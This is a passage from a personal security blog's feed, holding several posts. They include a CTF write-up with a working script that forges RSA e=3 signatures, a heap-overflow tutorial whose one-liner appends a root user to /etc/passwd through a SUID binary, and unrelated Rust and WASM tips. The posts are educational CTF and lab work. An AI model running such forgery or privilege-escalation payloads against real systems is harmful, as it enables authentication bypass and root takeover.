and checked the last endpoint.&lt;/p&gt;
&lt;p&gt;The last endpoint returns the public key. The public key isn&apos;t usually
interesting, but we are doing a security challenge that requires forging
a key. Therefore, I downloaded the key and extracted the modulus and the
exponent.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/public-key-information.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Interesting. The public exponent is 3. I remember, from when I was in
college doing cryptography, that using an exponent of 3 isn&apos;t insecure
but can lead to security issues. For example, we could use the &lt;a href=&quot;https://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/&quot;&gt;Chinese
Theorem&lt;/a&gt;
to attack RSA. With that information, I started researching how to forge
keys when the public exponent is 3.&lt;/p&gt;
&lt;p&gt;I found an &lt;a href=&quot;https://blog.trailofbits.com/2019/07/08/fuck-rsa/&quot;&gt;awesome article explaining several RSA
vulnerabilities&lt;/a&gt; at a
high level. This post has a section dedicated to the public exponent,
which introduces many vulnerabilities when it has the value 3. They
mention an attack found in 2006 by Bleinchenbacher that allowed him to
forge arbitrary signatures in different RSA implementations. They also
add a link to another blog explaining &lt;a href=&quot;https://www.imperialviolet.org/2014/09/26/pkcs1.html&quot;&gt;how this attack was used against
the RSA implementations used in Firefox and
Chrome&lt;/a&gt;. Anyway, I
want to understand the &lt;a href=&quot;https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/&quot;&gt;original
attack&lt;/a&gt;
now.&lt;/p&gt;
&lt;p&gt;The flaw that Daniel Bleichenbacher found was that the RSA
implementation didn&apos;t check the hash+ASN.1 data was right-justified. The
RSA signature follows the structure
&lt;code&gt;00 01 FF FF FF ... FF 00  ASN.1  HASH&lt;/code&gt;. However, he could forge
signatures with the structure
&lt;code&gt;00 01 FF FF ... FF 00  ASN.1  HASH  GARBAGE&lt;/code&gt;. He creates the initial
part with whatever hash of a message he wants
&lt;code&gt;00 01 FF ... FF 00 ASN.1 HASH&lt;/code&gt; and computes the garbage data that, when
appended, results in a valid signature. In this case, computing the
signature is easy. Since the public exponent is 3, we only need to
calculate the cube root. In other words, cube root of
&lt;code&gt;00 01 FF ... FF 00  ASN.1  HASH  GARBAGE&lt;/code&gt;. Nevertheless, the &quot;verify&quot;
implementation of our challenge checks that the digest is at the right.
We have to search for something else. I was stuck there for hours,
reading the code until I asked the community for help.&lt;/p&gt;
&lt;p&gt;The community told me that I was on the right track. We have to use the
Bleichenbacher attack, but instead of adding garbage to the end, we have
to add it somewhere in the middle. There is some length that isn&apos;t
verified. So, I did some more research on the internet and found a
&lt;a href=&quot;https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/&quot;&gt;variant of the Bleichenbacher
attack&lt;/a&gt;
which does that. In that specific article, they build something with the
format &lt;code&gt;00 01 XX ... XX 00  ASN.1  HASH&lt;/code&gt; where XX are the random bytes.
That could help us later. Now, we have to find the vulnerability in our
code. For that, I also needed help from the community.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def verify(self, m, s):
    ...

    sequence = DerSequence()
    sequence.decode(digest_info)
    _digest_algorithm_identifier, _digest = sequence

    sequence = DerSequence()
    sequence.decode(_digest_algorithm_identifier)
    _digest_algorithm_identifier = sequence[0]

    object_id = DerObjectId()
    object_id.decode(_digest_algorithm_identifier)
    digest_algorithm_identifier = object_id.value
    if digest_algorithm_identifier != &apos;2.16.840.1.101.3.4.2.1&apos;:
        raise Exception(&apos;invalid digest algorithm identifier&apos;)

    _null = sequence[1]
    null = DerNull()
    null.decode(_null)

    octet_string = DerOctetString()
    octet_string.decode(_digest)
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the snippet above, we have the vulnerable code. The problem is that
the function does not check that the &quot;digest_info&quot; has two items. It
extracts the &quot;_digest_algorithm_identifier&quot; and the &quot;_digest&quot;, but we
could have garbage behind them. Therefore, a signature with the
structure &lt;code&gt;00 01 FF ... FF 00  ASN.1  XX  HASH&lt;/code&gt; is valid. With that and
the article that we found earlier on the &lt;a href=&quot;https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/&quot;&gt;variant of the Bleichenbacher
attack&lt;/a&gt;,
we are ready to exploit the webpage.&lt;/p&gt;
&lt;p&gt;I&apos;m not going to explain in detail how the variant works, only the
general idea.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create the suffix payload. In other words, the information the
signature should contain at the end. Then, we compute how this
information will look in the final signature.&lt;/li&gt;
&lt;li&gt;Create the prefix, that is the initial data the signature will
contain plus random bytes. Then, we compute the cube root to get a
valid fake signature.&lt;/li&gt;
&lt;li&gt;Overwrite the last prefix fake signatures with the suffix fake
signature. So, if the fake signature prefix is 110000 and the fake
signature suffix is 11, the resulting forged key is 110011.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After modifying the code in the article, we end with the following
script.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import hashlib
import os
import json
import requests

from gmpy2 import mpz, iroot
from Crypto.Util.asn1 import DerSequence, DerObjectId, DerOctetString, DerNull


def to_bytes(n):
    &quot;&quot;&quot;Return a bytes representation of a int&quot;&quot;&quot;
    return n.to_bytes((n.bit_length() // 8) + 1, byteorder=&quot;big&quot;)


def from_bytes(b):
    &quot;&quot;&quot;Makes a int from a bytestring&quot;&quot;&quot;
    return int.from_bytes(b, byteorder=&quot;big&quot;)


def get_bit(n, b):
    &quot;&quot;&quot;Returns the b-th rightmost bit of n&quot;&quot;&quot;
    return ((1 &amp;lt;&amp;lt; b) &amp;amp; n) &amp;gt;&amp;gt; b


def set_bit(n, b, x):
    &quot;&quot;&quot;Returns n with the b-th rightmost bit set to x&quot;&quot;&quot;
    if x == 0:
        return ~(1 &amp;lt;&amp;lt; b) &amp;amp; n
    if x == 1:
        return (1 &amp;lt;&amp;lt; b) | n


def cube_root(n):
    return int(iroot(mpz(n), 3)[0])


def suffix_sig_flip(suffix_bytes):
    sig_suffix = 1
    for b in range(len(suffix) * 8):
        if get_bit(sig_suffix**3, b) != get_bit(from_bytes(suffix), b):
            sig_suffix = set_bit(sig_suffix, b, 1)
    return sig_suffix


KEY_ID = &quot;pzero-adventures&quot;
NAME = &quot;aaa&quot;
SCORE = -65535
KEY_SIZE_BITS = 2048
KEY_SIZE_BYTES = KEY_SIZE_BITS // 8

# Forge suffix signature
message = json.dumps([KEY_ID, NAME, SCORE]).encode()
message_digest = hashlib.sha256(message).digest()
suffix = DerOctetString(message_digest).encode()
sig_suffix = suffix_sig_flip(suffix)

# Compute prefix
prefix = &quot;&quot;
random_bytes = 0
# Prefix length must be equal to key size
# We need this loop to search for the number of garbage bytes
# that will eventually give us a prefix with size equal to the key size
while len(prefix) != KEY_SIZE_BYTES and len(prefix) &amp;lt; KEY_SIZE_BYTES:
    digest_algorithm_identifier = DerSequence(
        [
            DerObjectId(&quot;2.16.840.1.101.3.4.2.1&quot;).encode(),
            DerNull().encode(),
            DerOctetString(os.urandom(random_bytes)).encode(),
        ]
    )
    digest_info = DerSequence(([digest_algorithm_identifier, suffix]))
    prefix = b&quot;\x00\x01&quot; + (b&quot;\xff&quot; * 8) + b&quot;\x00&quot; + digest_info.encode()
    random_bytes += 1
if len(prefix) != KEY_SIZE_BYTES:
    print(&quot;Something is wrong&quot;)
    exit(0)

# Forge prefix signature
sig_prefix = to_bytes(cube_root(from_bytes(prefix)))[: -len(to_bytes(sig_suffix))]

# Compute forged signature and add padding
sig = sig_prefix + to_bytes(sig_suffix)
sig = b&quot;\x00&quot; * (KEY_SIZE_BYTES - len(sig)) + sig

r = requests.post(
    &quot;http://pzero-adventures-web.h4ck.ctfcompetition.com/api/highscores&quot;,
    json={&quot;name&quot;: NAME, &quot;score&quot;: SCORE, &quot;signature&quot;: sig.hex()},
)
print(f&quot;Server response: {r.text}&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Executing the script prints the flag in the terminal. With that, we
completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch03/</guid><description>Decode H4ck1ng G00gl3 ep005 challenge 03: uncover hidden Morse code in the episodes, translate it to find the secret message, and complete the series.</description><pubDate>Fri, 02 Dec 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;For this challenge, we don&apos;t have any data. We have to find the secret
message hidden in the episodes. I opened all the episodes in different
browser tabs and looked at each introduction. I searched for colours,
letters, keywords and any information I could see on the screen.
Besides, I was carefully listening to the storyteller. After a couple of
hours of watching the introductions in a loop, I asked the community for
help.&lt;/p&gt;
&lt;p&gt;It turns out that there is a message in morse. In each episode&apos;s
introduction, around the time when a person enters and sits on the
chair, some high-frequency sounds start to play. It never occurred to me
that it could be morse. In any case, I decreased the video speed to 0.25
and started taking notes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/morse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I transformed morse into English and copied the link on the browser. It
didn&apos;t work. I was stuck for a while here checking the episodes and my
notes. The problem was that they made a mistake and put the same message
in two episodes. I found out by asking the community. After fixing that,
I managed to get the last flag.&lt;/p&gt;
&lt;p&gt;With that, we completed the challenge and the entire series.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch03/final.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Heap-based buffer overflows</title><link>https://danielorihuela.dev/blog/heap-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/heap-based-buffer-overflows/</guid><description>Learn how heap-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Sun, 19 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#stack-vs-heap-based-buffer-overflows&quot;&gt;Stack vs Heap-based buffer
overflows?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#system-information&quot;&gt;System information&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#exercise&quot;&gt;Exercise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bonus-points&quot;&gt;Bonus points&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;In a previous post, I explained what a &lt;a href=&quot;../stack-based-buffer-overflows&quot;&gt;stack-based buffer
overflow&lt;/a&gt; is and how it works. Today,
we are going to see the heap-based variant.&lt;/p&gt;
&lt;h1&gt;Stack vs Heap-based buffer overflows?&lt;/h1&gt;
&lt;p&gt;The difference between those two types is the region of memory where the
exploited variables reside. That&apos;s easy to see in the C language. All
variables are stored in the stack unless we use functions to allocate
memory in the heap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Variables stored in the stack
int auth_flag = 0;
char password_buffer[16];

# Variables stored in the heap
buffer = (char *)ec_malloc(100);
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;System information&lt;/h1&gt;
&lt;p&gt;Before starting, let me mention some information about my system. Take
them into account if you try to replicate the results. They may vary
from machine to machine.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux 5.15.0-86-generic x86_64&lt;/li&gt;
&lt;li&gt;Intel(R) Core(TM) i7-10510U CPU&lt;/li&gt;
&lt;li&gt;Little Endian&lt;/li&gt;
&lt;li&gt;48 bits address size&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Exercise&lt;/h1&gt;
&lt;p&gt;We are going to exploit the &lt;code&gt;notetaker.c&lt;/code&gt; program from &lt;strong&gt;Hacking: The
Art of Exploitation, 2nd Edition&lt;/strong&gt;. You can get the source code at
&lt;a href=&quot;https://github.com/intere/hacking/blob/master/booksrc&quot;&gt;https://github.com/intere/hacking/blob/master/booksrc&lt;/a&gt;. The program
creates notes in &lt;code&gt;/var/notes&lt;/code&gt;. Creating and modifying files in the root
path requires root permissions. Hence, the executable of this program
must be owned by the root and have the SUID activated. That way, we can
execute it with normal users as if they were root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &quot;hacking.h&quot;

void usage(char *prog_name, char *filename)
{
  printf(&quot;Usage: %s &amp;lt;data to add to %s&amp;gt;\n&quot;, prog_name, filename);
  exit(0);
}

void fatal(char *);            // A function for fatal errors
void *ec_malloc(unsigned int); // An error-checked malloc() wrapper

int main(int argc, char *argv[])
{
  int userid, fd; // File descriptor
  char *buffer, *datafile;

  buffer = (char *)ec_malloc(100);
  datafile = (char *)ec_malloc(20);
  strcpy(datafile, &quot;/var/notes&quot;);

  if (argc &amp;lt; 2)                 // If there aren&apos;t command-line arguments,
    usage(argv[0], datafile); // display usage message and exit.

  strcpy(buffer, argv[1]); // Copy into buffer.

  printf(&quot;[DEBUG] buffer @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);
  printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);

  // Opening the file
  fd = open(datafile, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);
  if (fd == -1)
    fatal(&quot;in main() while opening file&quot;);
  printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);

  userid = getuid(); // Get the real user ID.

  // Writing data
  if (write(fd, &amp;amp;userid, 4) == -1) // Write user ID before note data.
    fatal(&quot;in main() while writing userid to file&quot;);
  write(fd, &quot;\n&quot;, 1);                          // Terminate line.
  if (write(fd, buffer, strlen(buffer)) == -1) // Write note.
    fatal(&quot;in main() while writing buffer to file&quot;);

  write(fd, &quot;\n&quot;, 1); // Terminate line.
  // Closing file
  if (close(fd) == -1)
    fatal(&quot;in main() while closing file&quot;);
  printf(&quot;Note has been saved.\n&quot;);
  free(buffer);
  free(datafile);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The error is copying the data from &lt;code&gt;argv[1]&lt;/code&gt; to the buffer without
checking the length. We can overflow the &lt;code&gt;buffer&lt;/code&gt; variable if we pass a
long enough argument to the executable and overwrite the &lt;code&gt;datafile&lt;/code&gt;
data.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;buffer = (char *)ec_malloc(100);
datafile = (char *)ec_malloc(20);
strcpy(datafile, &quot;/var/notes&quot;);

if (argc &amp;lt; 2)                 // If there aren&apos;t command-line arguments,
  usage(argv[0], datafile); // display usage message and exit.

strcpy(buffer, argv[1]); // Copy into buffer.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s compile the program and give it the proper permissions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc notetaker.c -o notetaker -g
sudo chown root:root notetaker
sudo chmod u+s notetaker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can write to whatever file we want, &lt;code&gt;testfile&lt;/code&gt; for example.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/heap-based-buffer-overflow/create-testfile.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We exploited it!&lt;/p&gt;
&lt;h1&gt;Bonus points&lt;/h1&gt;
&lt;p&gt;The exercise is helpful but dull. We can do something more interesting
when exploiting that program. We can create a new root user with any
password that we want. Let me show you.&lt;/p&gt;
&lt;p&gt;In Linux, there’s the /etc/passwd file where the basic information
related to users is stored. Each entry includes the login name, hashed
password, user id, group id, username, home directory and login shell of
a user, separated by colons (e.g. &lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/code&gt;). We
can add a manually prepared entry to &lt;code&gt;/etc/passwd&lt;/code&gt;, but how do we create
the hashed password?&lt;/p&gt;
&lt;p&gt;There are plenty of hashing functions. There&apos;s no constraint in linux,
so we can use whichever one we want. I decided to use &lt;code&gt;crypt&lt;/code&gt; from perl
with a simple password (1234) and salt (AA).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;perl -e &apos;print crypt(&quot;1234&quot;, &quot;AA&quot;), &quot;\n&quot;&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The result is &lt;code&gt;AA3BKXQMdIWHE&lt;/code&gt;. The entry would then look like
&lt;code&gt;newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/bin/bash&lt;/code&gt;. There&apos;s still
another problem to solve. Remember that for the exploit to work, the
final part of the argument must be the file where we want to write the
data. It should be something similar to
&lt;code&gt;newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/etc/passwd&lt;/code&gt;. However, this is
not a valid entry. The last part is no longer a shell, but a file. We
can sidestep this problem with a symbolic link. That&apos;s the cool part,
pay attention.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /tmp/etc
ln -s /bin/bash /tmp/etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We just created a symbolic link in &lt;code&gt;/tmp/etc/passwd&lt;/code&gt; to a shell. That
way, we can create a payload that ends with a login shell and the
filename we want to overwrite. Pretty slick, right? We can then rewrite
the entry as &lt;code&gt;newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/tmp/etc/passwd&lt;/code&gt;.
The last step is to make it longer to overflow the buffer.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./notetaker $(perl -e &apos;print &quot;newrootuser:AA3BKXQMdIWHE:0:0:&quot;, &quot;A&quot; x 71, &quot;:/root:/tmp/etc/passwd&quot;&apos;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/heap-based-buffer-overflow/root-access.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Exploiting heap and stack buffer overflows has the same difficulty.
Everything we know about one variant can be applied to the other (as far
as I know). They are easy to exploit and protect. However, software
engineers should be aware of their existence and how to avoid them.
There is no excuse for avoiding them in your programs!&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/heap-overflow.CvuaMumU.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to patch a git dependency in rust with same location but different branch</title><link>https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</guid><description>Learn to patch Rust git dependencies using different branches with the same repository.</description><pubDate>Mon, 29 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;At my current employer, we are developing multiple internal libraries in
Rust. They are hosted in a git based code hosting.
&lt;a href=&quot;https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#specifying-dependencies-from-git-repositories&quot;&gt;Here&lt;/a&gt;
is how we can specify them from a different repository.&lt;/p&gt;
&lt;p&gt;Sometimes we want to modify a repository (we will call it &quot;Start&quot;) that
happens to be one of the lowest dependencies in the tree. And we want to
test that a specific repository (we will call it &quot;End&quot;) that uses the
&quot;Start&quot; dependency indirectly still works. For instance, we could have
the following chain of dependencies: &quot;End&quot; -&amp;gt; &quot;A&quot; -&amp;gt; &quot;B&quot; -&amp;gt; &quot;C&quot; -&amp;gt;
&quot;Start&quot;, where &quot;-&amp;gt;&quot; represents a dependency.&lt;/p&gt;
&lt;p&gt;Rust allows to &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;override
dependencies&lt;/a&gt;, but it
does not work in all situations. For instance, it &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;does not allow
patching a git repository using a different branch of the same
repository&lt;/a&gt;. The
&lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478#issuecomment-1506056467&quot;&gt;fix&lt;/a&gt;
is simple but easy to misconfigure. I have problems configuring it every
time I need to do it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[patch.&apos;https://github.com/company/Start&apos;]
start = { git = &quot;https://www.github.com/company//Start.git&quot;, branch = &quot;new-feature&quot; }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There are two important details there.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The patch url does not include the trailing &quot;.git&quot;&lt;/li&gt;
&lt;li&gt;The url in the second line contains &quot;//&quot; before &quot;Start.git&quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Without these two things, you will end with the following error:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Caused by:
  patch for `start` in `https://github.com/company/Start` points to the same source, but patches must point
  to different sources
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/patch-dependency.BXipaHaQ.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to use WASM code from ClojureScript through JavaScript interop</title><link>https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</guid><description>Learn to use WASM code in ClojureScript via JavaScript interop. Explore Rust functions, wasm-bindgen crate, and seamless integration with JS for efficient coding.</description><pubDate>Sat, 10 Jun 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Clojure is a great programming language. I have been working with it
lately, and it&apos;s been a blast. Another language that I love is Rust. One
day I was thinking about both languages, their advantages and
disadvantages, and under which circumstances I should use each. That
made me wonder if it would be hard to use WASM from Clojurescript.&lt;/p&gt;
&lt;p&gt;My idea was to:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a simple function in Rust&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&quot;https://github.com/rustwasm/wasm-bindgen&quot;&gt;wasm-bindgen&lt;/a&gt; crate
to generate the WASM code and JavaScript bindings.&lt;/li&gt;
&lt;li&gt;Load the code into JavaScript&lt;/li&gt;
&lt;li&gt;Call WASM code from ClojureScript through the JavaScript interops&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;You can check the final code at
&lt;a href=&quot;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&quot;&gt;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The first two steps were easy. I created a simple Rust function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;use wasm_bindgen::prelude::*;

#[wasm_bindgen]
pub fn add(a: u8, b: u8) -&amp;gt; u8 {
    a + b
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then, I built the WASM code and JavaScript bindings with the following
command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wasm-pack build --target web
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now is when the interesting part starts. We want to use the generated
JavaScript bindings to call the WASM code. First, we need to &lt;a href=&quot;https://clojurescript.org/guides/quick-start&quot;&gt;create a
simple website&lt;/a&gt; and &lt;a href=&quot;https://rustwasm.github.io/wasm-bindgen/examples/without-a-bundler.html?highlight=wasm-pack%20build%20--target%20web#without-a-bundler&quot;&gt;load
the code in the
browser&lt;/a&gt;.
In our case, we want to access the WASM functions from the &quot;windows&quot;
object. So I ended up with the following piece of code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&quot;module&quot;&amp;gt;
  import init, { add } from &apos;./wasm/addition.js&apos;

  async function run() {
    await init();
    window.addWasm = add;
  }

  await run();
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The WASM is now loaded. We are ready to execute the &quot;hello world&quot;
website.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;clj -M --main cljs.main --compile hello-world.core --repl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But there&apos;s one problem.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/browser-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The wasm file cannot be validated. I suspect it is related to Will
Cohen&apos;s comment on &lt;a href=&quot;https://clojure.atlassian.net/browse/CLJS-3387&quot;&gt;https://clojure.atlassian.net/browse/CLJS-3387&lt;/a&gt;. So
I tried to serve it with
&lt;a href=&quot;https://github.com/svenstaro/miniserve&quot;&gt;miniserve&lt;/a&gt;. It worked!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/no-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can call WASM code with with the following approach: The
&lt;a href=&quot;https://cljs.info/cheatsheet/&quot;&gt;cheatsheet&lt;/a&gt; tells us how to access the
function we jsut exported.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(. js/window (addWasm 5 10))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/result.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;You can check the final code at
&lt;a href=&quot;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&quot;&gt;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And this is how we can call WASM from ClojureScript from a basic
project. The problem with that approach is that we lost the REPL since
we cannot use the ClojureScript browser. However, you will probably use
a build tool like
&lt;a href=&quot;https://github.com/thheller/shadow-cljs&quot;&gt;shadow-cljs&lt;/a&gt;. An approach
exists for shadow-cljs to use WASM with the REPL. You can check it
&lt;a href=&quot;https://github.com/thheller/wasm-pack-cljs&quot;&gt;https://github.com/thheller/wasm-pack-cljs&lt;/a&gt;.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/cljs-wasm-js.Cyo-3vbn.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How does Key Transparency work?</title><link>https://danielorihuela.dev/blog/key-transparency-high-level/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/key-transparency-high-level/</guid><description>How does Key Transparency secure public key distribution? Discover how protocols like CONIKS and WhatsApp&apos;s implementation tackle these challenges.</description><pubDate>Sat, 06 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#context&quot;&gt;Context&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#whats-key-transparency&quot;&gt;What&apos;s Key Transparency?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-does-it-work-coniks&quot;&gt;How does it work (CONIKS)?&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#data-structures&quot;&gt;Data Structures&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#merkle-tree&quot;&gt;Merkle Tree&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#user-identifier-to-public-key-map&quot;&gt;User identifier to Public Key
map&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#protocol-phases&quot;&gt;Protocol phases&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#registration-phase&quot;&gt;Registration phase&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lookup-phase&quot;&gt;Lookup phase&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#monitoring-phase&quot;&gt;Monitoring phase&lt;/a&gt;&lt;/li&gt;
